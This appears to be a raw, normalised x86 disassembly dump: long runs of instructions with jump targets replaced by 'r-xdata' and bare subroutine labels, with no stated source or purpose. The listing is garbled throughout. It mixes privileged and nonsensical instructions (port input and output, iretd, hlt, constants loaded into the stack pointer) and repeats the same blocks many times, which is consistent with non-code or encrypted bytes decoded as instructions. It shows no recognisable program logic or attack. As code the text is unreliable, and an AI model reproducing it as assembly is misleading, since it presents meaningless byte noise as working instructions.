dec [ eax - 0x7f ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
arpl dx si
aas
pop edi
inc edx
cmp [ ebx + 0x74 ] ah
std
int3
dec eax
add [ esp + eax * 4 + 0x3ff2bb48 ] 0x3ff2635f
inc esi
jle r-xdata
sbb eax 0x925b42f8
jmp r-xdata
sahf
pushfd
test [ ebx + ebp * 8 - 0x44b71415 ] al
xchg edx eax
jge r-xdata
test bl ch
sbb eax 0x929106f2
jpo r-xdata
jmp r-xdata
jmp r-xdata
test bl ch
je r-xdata
test ah ch
sti
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
push cs
int1
mov ebp [ edx + esi * 8 ]
cmp eax 0x96179337
imul ebp [ ebp + 0x7b ] 0x7b
clc
add al 0x67
jpe r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
cmp eax 0x96179337
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub_47ad05
[ edi - 0x15 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
sub al 0xf2
adc edi [ edi + 0x7a ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test ch ch
retn
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
cmp eax 0x96179337
push cs
int1
mov ebp [ edx + esi * 8 ]
test [ eax + esi * 8 + 0x7fb792a3 ] al
jpo r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub_47ad18
mov ebx 0x7a16ff74
jpo r-xdata
pop esi
mov esp 0x817873e
pop ecx
jpo r-xdata
imul [ edi * 2 - 0x14a0000a ]
jpo r-xdata
jpo r-xdata
in eax dx
jpo r-xdata
retn
xchg edx eax
mov bh 0x98
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
adc [ esi ] edx
jmp r-xdata
sub_47ad58
adc [ ebx - 0x6e ] edi
push ebp
mov al [ 0xffffffffeb7b7b62 ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
jo r-xdata
jmp r-xdata
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
std
jpo r-xdata
test [ ebx + edx * 4 - 0x7b7b5f69 ] al
xchg edx eax
mov edx 0xeb7b7b7c
jmp r-xdata
adc [ esi ] edx
jmp r-xdata
ja r-xdata
jpo r-xdata
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
xchg edi eax
retn
pop ebx
jpo r-xdata
jpo r-xdata
push eax
jpo r-xdata
xchg edx eax
xchg eax esi
jmp r-xdata
xchg [ es : esi + edi * 8 + 0x7c ] esi
jpo r-xdata
mov ebx 0x6974923b
jpo r-xdata
adc [ ebx + 0x22 ] ecx
xchg edx eax
call 0xfffffffffacc33e8
mov esp 0x7b7b7bb1
xchg edx eax
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
jpo r-xdata
jpo r-xdata
dec ebx
ja r-xdata
jmp r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
jmp r-xdata
inc edx
dec edi
push 0xffffff92
in al dx
jo r-xdata
stosd [ edi ]
xchg edx eax
jle r-xdata
test [ esi ] cl
lahf
test [ edi ] ch
clc
push es
xchg [ edx + 0x74 ] edi
dec [ esi ]
outsd
jpo r-xdata
aas
dec ebx
imul edi [ eax + 0x292bb48 ] 0xffffffa8
test [ ebx + ebp * 8 + 0xd84ebeb ] al
sub edx [ edx - 0x7b7b6a8f ]
jmp r-xdata
xchg edx eax
jno r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
[ esi - 0x6c7b7b4d ]
sub ebp eax
fdivr [ ebp + 0x6a93351c ]
stosb [ edi ]
test [ edx + edx * 4 + 0x7b7b7605 ] al
jmp r-xdata
jpo r-xdata
jae r-xdata
test [ ebx + ebp * 8 + 0x2e93ebeb ] al
add [ esp + eax * 4 - 0x296d4402 ] 0xffffff89
test [ esp + esi * 2 - 0x7b56b301 ] al
test dh dh
mov bl 0x92
shr [ ecx - 0x7b147b7c ] 0x1
in al dx
cli
and esi edx
xchg [ edx - 0x7b7b45eb ] edx
jmp r-xdata
jmp r-xdata
xchg edx eax
inc eax
test al 0x84
test bl ch
jmp r-xdata
mov bl 0x84
test bl ch
jmp r-xdata
test [ ebx + edx * 4 - 0x7b7b403c ] al
and cl [ eax - 0x45 ]
cmp edx [ edx + 0x7b7b6974 ]
jmp r-xdata
je r-xdata
fwait
test [ eax + esi * 8 + 0x47134f3d ] al
jno r-xdata
push cs
je r-xdata
mov edi 0x2ef68484
cmpsd [ esi ] [ edi ]
xchg edx eax
push eax
outsd
dec edx
cmovpo esi [ edi - 0x43 ]
mov esp 0xebeb8484
jmp r-xdata
sahf
mov bl 0x84
test [ ebx + 0x7b7b63c7 ] dl
sub esi [ ebp + edi * 8 + 0x78 ]
jpo r-xdata
js r-xdata
ja r-xdata
jpo r-xdata
jmp r-xdata
cmpsd [ esi ] [ edi ]
inc eax
cmp eax 0x6bfe744f
jpo r-xdata
xchg eax esi
sub [ ebp + ebp - 0x71356db9 ] al
test [ ebx + ebp * 8 - 0x356d1415 ] al
imul edi [ ebx + 0x7b ] 0xebebebeb
jmp r-xdata
test [ ebx + ebp * 8 - 0xde21415 ] al
scasd [ edi ]
and edx [ ecx ]
or al dh
sub_47ad94
mov esp 0x5b59833e
pop ecx
pop esi
mov esp 0x817873e
pop ecx
jpo r-xdata
jpo r-xdata
in eax dx
retn
xchg edx eax
mov bh 0x98
test [ ebx + ebp * 8 + 0x3ef21deb ] al
mov [ 0xfffffffff0161123 ] eax
stosd [ edi ]
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
adc [ esi ] edx
jmp r-xdata
sub_47adca
outsd
jo r-xdata
jmp r-xdata
std
jpo r-xdata
test [ ebx + edx * 4 - 0x7b7b5f69 ] al
xchg edx eax
mov edx 0xeb7b7b7c
jmp r-xdata
ja r-xdata
jpo r-xdata
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
xchg edi eax
retn
pop ebx
jpo r-xdata
jpo r-xdata
push eax
jpo r-xdata
xchg edx eax
xchg eax esi
jmp r-xdata
mov al [ 0xffffffffeb7b7b62 ]
jmp r-xdata
jmp r-xdata
xchg [ es : esi + edi * 8 + 0x7c ] esi
jpo r-xdata
mov ebx 0x6974923b
jpo r-xdata
adc [ ebx + 0x22 ] ecx
xchg edx eax
call 0xfffffffffacc33e8
mov esp 0x7b7b7bb1
xchg edx eax
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
dec ebx
ja r-xdata
jmp r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
jmp r-xdata
inc edx
dec edi
push 0xffffff92
in al dx
jo r-xdata
stosd [ edi ]
xchg edx eax
jle r-xdata
test [ esi ] cl
lahf
test [ edi ] ch
clc
push es
xchg [ edx + 0x74 ] edi
dec [ esi ]
outsd
jpo r-xdata
aas
dec ebx
imul edi [ eax + 0x292bb48 ] 0xffffffa8
test [ ebx + ebp * 8 + 0xd84ebeb ] al
sub edx [ edx - 0x7b7b6a8f ]
jmp r-xdata
xchg edx eax
jno r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
adc [ esi ] edx
jmp r-xdata
[ esi - 0x6c7b7b4d ]
sub ebp eax
fdivr [ ebp + 0x6a93351c ]
stosb [ edi ]
test [ edx + edx * 4 + 0x7b7b7605 ] al
jmp r-xdata
jpo r-xdata
jae r-xdata
test [ ebx + ebp * 8 + 0x2e93ebeb ] al
add [ esp + eax * 4 - 0x296d4402 ] 0xffffff89
test [ esp + esi * 2 - 0x7b56b301 ] al
test dh dh
mov bl 0x92
shr [ ecx - 0x7b147b7c ] 0x1
in al dx
cli
and esi edx
xchg [ edx - 0x7b7b45eb ] edx
jmp r-xdata
jmp r-xdata
xchg edx eax
inc eax
test al 0x84
test bl ch
jmp r-xdata
mov bl 0x84
test bl ch
jmp r-xdata
test [ ebx + edx * 4 - 0x7b7b403c ] al
and cl [ eax - 0x45 ]
cmp edx [ edx + 0x7b7b6974 ]
jmp r-xdata
je r-xdata
fwait
test [ eax + esi * 8 + 0x47134f3d ] al
jno r-xdata
push cs
je r-xdata
mov edi 0x2ef68484
cmpsd [ esi ] [ edi ]
xchg edx eax
push eax
outsd
dec edx
cmovpo esi [ edi - 0x43 ]
mov esp 0xebeb8484
jmp r-xdata
sahf
mov bl 0x84
test [ ebx + 0x7b7b63c7 ] dl
sub esi [ ebp + edi * 8 + 0x78 ]
jpo r-xdata
js r-xdata
ja r-xdata
jpo r-xdata
jmp r-xdata
cmpsd [ esi ] [ edi ]
inc eax
cmp eax 0x6bfe744f
jpo r-xdata
xchg eax esi
sub [ ebp + ebp - 0x71356db9 ] al
test [ ebx + ebp * 8 - 0x356d1415 ] al
imul edi [ ebx + 0x7b ] 0xebebebeb
jmp r-xdata
test [ ebx + ebp * 8 - 0xde21415 ] al
scasd [ edi ]
and edx [ ecx ]
or al dh
sub_47add2
jmp r-xdata
xchg [ eax + 0x7b ] esi
jpo r-xdata
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
xchg edi eax
retn
jmp r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub_47add5
0x927b7b73 0x62a0
jpo r-xdata
mov ss [ ecx ]
jpo r-xdata
jmp r-xdata
add [ esp + eax * 4 - 0x7b77f16e ] 0xffffff84
test ch ch
xlat
jpo r-xdata
jpo r-xdata
outsd
dec edi
jpo r-xdata
idiv [ esi ]
aas
mov esp 0xab84823e
xchg edx eax
rcr [ edx - 0x14147b7c ] cl
idiv dh
iretd
jo r-xdata
jmp r-xdata
fwait
test [ eax + esi * 8 + 0x47134f3d ] al
jno r-xdata
mov [ esp + eax * 4 + 0x7bd7ed84 ] al
jpo r-xdata
xchg edx eax
xchg edx eax
mov [ esp + eax * 4 - 0x7b6c6a6d ] eax
test al bh
mov edi 0x8bcd9277
test [ esp + ebp - 0xdd7d3d4 ] al
push es
xchg [ ebp + ebp + 0x6f02c17 ] eax
imul esi esi 0x3e
xchg [ ebx ] ebp
sub al 0x84
push cs
ja r-xdata
aas
cmpsd [ esi ] [ edi ]
test [ 0x2d84284f ] ch
inc edi
xchg edx eax
0x848e
std
jpo r-xdata
test [ ebx + edx * 4 - 0x7b7b5f69 ] al
xchg edx eax
mov edx 0xeb7b7b7c
jmp r-xdata
cli
and esi edx
xchg [ edx - 0x7b7b45eb ] edx
jmp r-xdata
adc eax [ edi + 0x71 ]
pop eax
mov esp 0x7b7b7bb1
xchg edx eax
jpo r-xdata
ja r-xdata
jpo r-xdata
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
xchg edi eax
retn
pop ebx
jpo r-xdata
xchg [ es : esi + edi * 8 + 0x7c ] esi
jpo r-xdata
push eax
jpo r-xdata
xchg edx eax
inc eax
cmp eax 0x6bfe744f
jpo r-xdata
xchg eax esi
jmp r-xdata
mov al [ 0xffffffffeb7b7b62 ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov ebx 0x6974923b
jpo r-xdata
adc [ ebx + 0x22 ] ecx
xchg edx eax
call 0xfffffffffacc33e8
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
inc edx
dec edi
push 0xffffff92
in al dx
jo r-xdata
stosd [ edi ]
xchg edx eax
jle r-xdata
test [ esi ] cl
lahf
test [ edi ] ch
clc
push es
xchg [ edx + 0x74 ] edi
dec [ esi ]
dec ebx
ja r-xdata
jmp r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
sbb eax 0x21a12ef2
adc [ ebx ] ecx
sbb eax 0x92a72ef2
mov bh [ edi + 0x7b ]
jpo r-xdata
[ esi - 0x6c7b7b4d ]
sub ebp eax
fdivr [ ebp + 0x6a93351c ]
stosb [ edi ]
test [ edx + edx * 4 + 0x7b7b7605 ] al
jmp r-xdata
jpo r-xdata
jae r-xdata
test [ ebx + ebp * 8 + 0x2e93ebeb ] al
add [ esp + eax * 4 - 0x296d4402 ] 0xffffff89
test [ esp + esi * 2 - 0x7b56b301 ] al
test dh dh
mov bl 0x92
shr [ ecx - 0x7b147b7c ] 0x1
in al dx
outsd
jpo r-xdata
aas
dec ebx
imul edi [ eax + 0x292bb48 ] 0xffffffa8
test [ ebx + ebp * 8 + 0xd84ebeb ] al
sub edx [ edx - 0x7b7b6a8f ]
jmp r-xdata
xchg edx eax
jno r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
adc [ esi ] edx
jmp r-xdata
jmp r-xdata
je r-xdata
push cs
je r-xdata
jmp r-xdata
xchg edx eax
inc eax
test al 0x84
test bl ch
jmp r-xdata
mov bl 0x84
test bl ch
jmp r-xdata
test [ ebx + edx * 4 - 0x7b7b403c ] al
and cl [ eax - 0x45 ]
cmp edx [ edx + 0x7b7b6974 ]
mov esp 0xebeb8484
jmp r-xdata
sahf
mov bl 0x84
test [ ebx + 0x7b7b63c7 ] dl
sub esi [ ebp + edi * 8 + 0x78 ]
jpo r-xdata
js r-xdata
mov edi 0x2ef68484
cmpsd [ esi ] [ edi ]
xchg edx eax
push eax
outsd
dec edx
cmovpo esi [ edi - 0x43 ]
ja r-xdata
jpo r-xdata
jmp r-xdata
cmpsd [ esi ] [ edi ]
xchg eax esi
sub [ ebp + ebp - 0x71356db9 ] al
test [ ebx + ebp * 8 - 0x356d1415 ] al
imul edi [ ebx + 0x7b ] 0xebebebeb
jmp r-xdata
test [ ebx + ebp * 8 - 0xde21415 ] al
scasd [ edi ]
and edx [ ecx ]
or al dh
sub_47ae00
mov dl 0xf8
add [ esp + esi * 2 - 0x750f4512 ] 0xffffff92
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
jmp r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
add [ esp + eax * 4 - 0x7908010a ] 0x84
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
sub_47ae44
clc
mov edi 0x70879277
jpo r-xdata
js r-xdata
mov ebp 0xbcc3973e
mov dl [ ecx ]
jpo r-xdata
ja r-xdata
jpo r-xdata
test [ ebx + ebp * 8 - 0x30010915 ] al
jpo r-xdata
jpo r-xdata
push eax
jpo r-xdata
xchg edx eax
xchg eax esi
dec edi
jpo r-xdata
xor [ edx - 0x6e ] 0x59
mov esi 0x6f88484
ja r-xdata
mov ss [ ecx ]
jpo r-xdata
xchg [ es : esi + edi * 8 + 0x7c ] esi
jpo r-xdata
mov ebx 0x6974923b
jpo r-xdata
adc [ ebx + 0x22 ] ecx
xchg edx eax
call 0xfffffffffacc33e8
mov esp 0x7b7b7bb1
xchg edx eax
fwait
test [ eax + esi * 8 + 0x47134f3d ] al
jno r-xdata
mov [ esp + eax * 4 + 0x7bd7ed84 ] al
jpo r-xdata
aas
imul esi esi 0x3e
xchg [ ebx ] ebp
sub al 0x84
push cs
ja r-xdata
pop ss
sub al 0xf0
push es
xchg edx eax
mov ebx 0xeb848482
sub eax [ ebp + ebp - 0x4c0109ad ]
xchg [ esp + eax * 4 - 0x4e8f6dd5 ] al
test [ esi + esi * 8 + 0x79db5ff7 ] al
jpo r-xdata
add [ esp + eax * 4 - 0x7b77f16e ] 0xffffff84
test ch ch
xlat
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
dec ebx
ja r-xdata
jmp r-xdata
cli
and esi edx
xchg [ edx - 0x7b7b45eb ] edx
jmp r-xdata
adc eax [ edi + 0x71 ]
pop eax
xchg edx eax
xchg edx eax
mov [ esp + eax * 4 - 0x7b6c6a6d ] eax
test al bh
mov edi 0x8bcd9277
test [ esp + ebp - 0xdd7d3d4 ] al
push es
xchg [ ebp + ebp + 0x6f02c17 ] eax
idiv [ esi ]
aas
inc eax
cmp eax 0x6bfe744f
jpo r-xdata
cmpsd [ esi ] [ edi ]
test [ 0x2d84284f ] ch
inc edi
xchg edx eax
0x848e
xchg edx eax
0x7b69
sub dl [ edx - 0x7b7b63be ]
jmp r-xdata
mov esp 0xab84823e
xchg edx eax
rcr [ edx - 0x14147b7c ] cl
idiv dh
iretd
jmp r-xdata
inc edx
dec edi
push 0xffffff92
in al dx
jo r-xdata
stosd [ edi ]
xchg edx eax
jle r-xdata
test [ esi ] cl
lahf
test [ edi ] ch
clc
push es
xchg [ edx + 0x74 ] edi
dec [ esi ]
outsd
jpo r-xdata
aas
dec ebx
imul edi [ eax + 0x292bb48 ] 0xffffffa8
test [ ebx + ebp * 8 + 0xd84ebeb ] al
sub edx [ edx - 0x7b7b6a8f ]
jmp r-xdata
xchg edx eax
jno r-xdata
sub edx [ edx - 0x7b7b4e90 ]
div bh
pop edi
fstp [ ecx + 0x7b ]
jpo r-xdata
[ esi - 0x6c7b7b4d ]
sub ebp eax
fdivr [ ebp + 0x6a93351c ]
stosb [ edi ]
test [ edx + edx * 4 + 0x7b7b7605 ] al
jmp r-xdata
jpo r-xdata
jae r-xdata
test [ ebx + ebp * 8 + 0x2e93ebeb ] al
add [ esp + eax * 4 - 0x296d4402 ] 0xffffff89
test [ esp + esi * 2 - 0x7b56b301 ] al
test dh dh
mov bl 0x92
shr [ ecx - 0x7b147b7c ] 0x1
in al dx
jmp r-xdata
xchg edx eax
inc eax
test al 0x84
test bl ch
jmp r-xdata
mov bl 0x84
test bl ch
jmp r-xdata
test [ ebx + edx * 4 - 0x7b7b403c ] al
and cl [ eax - 0x45 ]
cmp edx [ edx + 0x7b7b6974 ]
xchg edx eax
inc edx
pushfd
test [ ebx + ebp * 8 + 0x77bff8eb ] al
xchg edx eax
xchg [ eax + 0x7b ] esi
jpo r-xdata
jmp r-xdata
je r-xdata
push cs
je r-xdata
mov edi 0x2ef68484
cmpsd [ esi ] [ edi ]
xchg edx eax
push eax
outsd
dec edx
cmovpo esi [ edi - 0x43 ]
mov [ 0xffffffffebeb8484 ] eax
jmp r-xdata
xchg edi eax
retn
mov esp 0xebeb8484
jmp r-xdata
sahf
mov bl 0x84
test [ ebx + 0x7b7b63c7 ] dl
sub esi [ ebp + edi * 8 + 0x78 ]
jpo r-xdata
jmp r-xdata
ja r-xdata
jpo r-xdata
xchg [ esp + eax * 4 - 0x7b691b6d ] al
test [ edx - 0x7b7b4df9 ] dl
jmp r-xdata
jmp r-xdata
cmpsd [ esi ] [ edi ]
xchg eax esi
add [ esp + eax * 4 - 0x7908010a ] 0x84
sub [ ebp + ebp - 0x71356db9 ] al
test [ ebx + ebp * 8 - 0x356d1415 ] al
imul edi [ ebx + 0x7b ] 0xebebebeb
jmp r-xdata
test [ ebx - 0x7b7b691c ] dl
xchg edx eax
pop es
mov dl 0x84
test bl ch
jmp r-xdata
test [ esi + esi * 8 - 0x7b790802 ] al
test [ ebx + ebp * 8 - 0xde21415 ] al
scasd [ edi ]
and edx [ ecx ]
or al dh
sub_47af81
sbb eax 0xf0452ef2
xor eax 0xffffffab
xchg edx eax
xor al 0xa7
test [ ebx + ebp * 8 - 0x14141415 ] al
div [ eax ]
xor ebp [ edx ]
[ ebx ] ah
xchg ebx eax
mov ecx 0x228484a7
xchg ebx eax
mov edi [ eax - 0x7c077b7c ]
jpe r-xdata
test [ ebx + ebp * 8 + 0x1db9f0eb ] al
[ edi ]
inc [ 0x4884848d ]
test [ edx + 0x7 ] al
pop edi
dec edi
je r-xdata
bound edi [ edx + 0x71928484 ]
mov edx 0xc4938484
mov edi 0x48228484
mov ebx 0x6974923b
jpo r-xdata
dec ebx
ja r-xdata
jmp r-xdata
outsd
jpo r-xdata
aas
dec ebx
imul edi [ eax + 0x292bb48 ] 0xffffffa8
test [ ebx + ebp * 8 + 0xd84ebeb ] al
sub edx [ edx - 0x7b7b6a8f ]
jmp r-xdata
xchg edx eax
jno r-xdata
jmp r-xdata
xchg edx eax
inc eax
mov esp 0xebeb8484
jmp r-xdata
test al 0x84
test bl ch
jmp r-xdata
mov bl 0x84
test bl ch
jmp r-xdata
test [ ebx + edx * 4 - 0x7b7b403c ] al
and cl [ eax - 0x45 ]
cmp edx [ edx + 0x7b7b6974 ]
mov edi 0x2ef68484
cmpsd [ esi ] [ edi ]
xchg edx eax
push eax
outsd
dec edx
cmovpo esi [ edi - 0x43 ]
je r-xdata
[ esi - 0x6c7b7b4d ]
sahf
mov bl 0x84
test [ ebx + 0x7b7b63c7 ] dl
sub_47afd5
cmp esi 0xffffffbb
xchg edx eax
pop edi
xchg esi eax
test [ ebx + ebp * 8 - 0x3ad6d3d3 ] al
fdivr [ ebp + 0x6a93351c ]
stosb [ edi ]
test [ edx + edx * 4 + 0x7b7b7605 ] al
jmp r-xdata
jmp r-xdata
mov esp 0xebeb8484
jmp r-xdata
mov edi 0x2ef68484
cmpsd [ esi ] [ edi ]
xchg edx eax
push eax
outsd
jpo r-xdata
jmp r-xdata
xchg edx eax
inc eax
sub_47aff6
mov ebx 0x81c7fef6
test [ esp + esi * 2 - 0x7b40d101 ] al
test dh dh
cmpsd [ cs : esi ] [ edi ]
jmp r-xdata
xchg edx eax
inc eax
mov esp 0xebeb8484
jmp r-xdata
xchg edx eax
push eax
outsd
jpo r-xdata
mov edi 0x2ef68484
cmpsd [ esi ] [ edi ]
sub_47b037
adc [ ebx + 0x7eb2107e ] bh
rol [ esi + ebp * 2 - 0xde28485 ] 0x6f
test al 0x84
test bl ch
jmp r-xdata
dec edx
cmovpo esi [ edi - 0x43 ]
aas
dec ebx
imul edi [ eax + 0x292bb48 ] 0xffffffa8
test [ ebx + ebp * 8 + 0xd84ebeb ] al
sub edx [ edx - 0x7b7b6a8f ]
jmp r-xdata
outsd
sub_47b06f
jpo r-xdata
retn 0x8484
jpo r-xdata
in al 0x7e
jpo r-xdata
test ch ch
xlat
jpo r-xdata
jmp sub_47b107
jmp r-xdata
mov esi 0xebeb8484
jmp r-xdata
jpo r-xdata
mov [ 0x15928484 ] eax
jle r-xdata
jpo r-xdata
inc eax
mov esp 0xebeb8484
jmp r-xdata
shl [ ebp - 0x14147b7c ] cl
insd
xchg edx eax
hlt
jpo r-xdata
xchg edx eax
idiv [ esi - 0x3d147b7c ]
mov edi 0x2ef68484
cmpsd [ esi ] [ edi ]
xchg edx eax
push eax
outsd
jpo r-xdata
jmp sub_47b06d
dec eax
mov ebx 0x92873e42
test [ ebx + edi * 2 - 0x41e66d85 ] al
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
mov esi 0xc2eb8484
jmp r-xdata
xchg edx eax
sub_47b088
mov al [ 0xffffffffa3c8ff74 ]
test [ edx + edx * 4 + 0x7b7b7e15 ] al
jmp r-xdata
xchg [ esp + eax * 4 + 0x7b756d93 ] al
jpo r-xdata
xchg edx eax
shl [ ebp - 0x14147b7c ] cl
jmp sub_47b06d
idiv [ esi - 0x3d147b7c ]
test [ ebx + edi * 2 - 0x41e66d85 ] al
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
mov esi 0xc2eb8484
sub_47b164
push 0xffffff92
cmp ebp [ edx + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
dec esi
jmp r-xdata
test [ ebx + ebp * 8 - 0x47c444b8 ] al
jmp r-xdata
push edi
xchg edx eax
in eax dx
add [ esp + eax * 4 + 0x4e9220eb ] 0x9d
popfd
sub_47b480
mov esp 0x1e23af3e
adc eax 0xa33ebc2d
and ebx [ ss : esi ]
shr [ edi + 0x7b ] 0x7b
and ah [ edx ]
xchg edx eax
mov [ 0xffffffffeb848490 ] eax
jmp r-xdata
jpo r-xdata
jmp r-xdata
xchg edi eax
pop es
jg r-xdata
xchg edx eax
pop eax
test eax 0xebeb8484
jmp r-xdata
jmp r-xdata
push ebx
jpo r-xdata
pop esp
jb r-xdata
cmpsd [ esi ] [ edi ]
adc eax 0x9336362d
mov esp 0x2d15a73e
xchg ebx eax
xchg edi eax
cli
push ds
lahf
jpo r-xdata
xchg edx eax
xchg edx eax
test al 0xbb
test [ edx + ebp + 0x2da04828 ] al
inc eax
adc [ edx - 0x7b7b794a ] 0xeb
jmp r-xdata
sub al 0xbb
test [ ebx + ebp * 8 - 0x14141415 ] al
xchg edx eax
sub [ edx - 0x7b7b4458 ] dl
sub ch [ eax ]
dec eax
mov al [ 0xffffffff9280402d ]
mov dh 0x86
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
xchg esp eax
xchg ebx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub_47b4a4
jmp r-xdata
adc eax 0x9336362d
shr [ edi + 0x7b ] 0x7b
and ah [ edx ]
xchg edx eax
mov [ 0xffffffffeb848490 ] eax
jmp r-xdata
jpo r-xdata
jmp r-xdata
xchg edi eax
pop es
jg r-xdata
xchg edx eax
pop eax
test eax 0xebeb8484
jmp r-xdata
jmp r-xdata
push ebx
jpo r-xdata
cmpsd [ esi ] [ edi ]
pop esp
jb r-xdata
mov esp 0x2d15a73e
xchg ebx eax
xchg edi eax
cli
push ds
lahf
jpo r-xdata
xchg edx eax
xchg edx eax
test al 0xbb
test [ edx + ebp + 0x2da04828 ] al
inc eax
adc [ edx - 0x7b7b794a ] 0xeb
jmp r-xdata
sub al 0xbb
test [ ebx + ebp * 8 - 0x14141415 ] al
xchg edx eax
sub [ edx - 0x7b7b4458 ] dl
sub ch [ eax ]
dec eax
mov al [ 0xffffffff9280402d ]
mov dh 0x86
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
xchg esp eax
xchg ebx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub_47b4a5
jmp r-xdata
sub eax 0x5c933636
shr [ edi + 0x7b ] 0x7b
and ah [ edx ]
xchg edx eax
mov [ 0xffffffffeb848490 ] eax
jmp r-xdata
jpo r-xdata
jmp r-xdata
xchg edi eax
pop es
jg r-xdata
xchg edx eax
pop eax
test eax 0xebeb8484
jmp r-xdata
jmp r-xdata
push ebx
jpo r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
adc eax 0x9336362d
pop esp
mov esp 0x2d15a73e
xchg ebx eax
xchg edi eax
cli
push ds
lahf
jpo r-xdata
xchg edx eax
xchg edx eax
test al 0xbb
test [ edx + ebp + 0x2da04828 ] al
inc eax
adc [ edx - 0x7b7b794a ] 0xeb
jmp r-xdata
sub al 0xbb
test [ ebx + ebp * 8 - 0x14141415 ] al
xchg edx eax
sub [ edx - 0x7b7b4458 ] dl
sub ch [ eax ]
dec eax
mov al [ 0xffffffff9280402d ]
mov dh 0x86
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
xchg esp eax
xchg ebx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub_47b4ad
jmp r-xdata
test bl ch
je r-xdata
push 0x76
clc
xchg edx eax
jle r-xdata
xchg edx eax
xchg edx eax
test al 0xbb
test [ edx + ebp + 0x2da04828 ] al
inc eax
adc [ edx - 0x7b7b794a ] 0xeb
jmp r-xdata
jpo r-xdata
jpo r-xdata
sub al 0xbb
test [ ebx + ebp * 8 - 0x14141415 ] al
xchg edx eax
sub [ edx - 0x7b7b4458 ] dl
sub ch [ eax ]
je r-xdata
jmp r-xdata
js r-xdata
xchg esp eax
xchg ebx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test [ edx ] ch
jpo r-xdata
dec eax
mov al [ 0xffffffff9280402d ]
mov dh 0x86
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
mov ebx 0x282a8484
sub [ eax - 0x60 ] cl
sub eax 0xb6928040
xchg [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
js r-xdata
push esi
outsd
cmp dl [ edx + 0x7b7b6a5a ]
je r-xdata
rol [ ebp - 0x6dd47b7c ] 0xc6
mov ebp 0x9d938484
outsb
jpo r-xdata
pop [ esp + eax * 4 - 0x678d6cd5 ]
test [ eax + edi * 8 - 0x6dd7a441 ] al
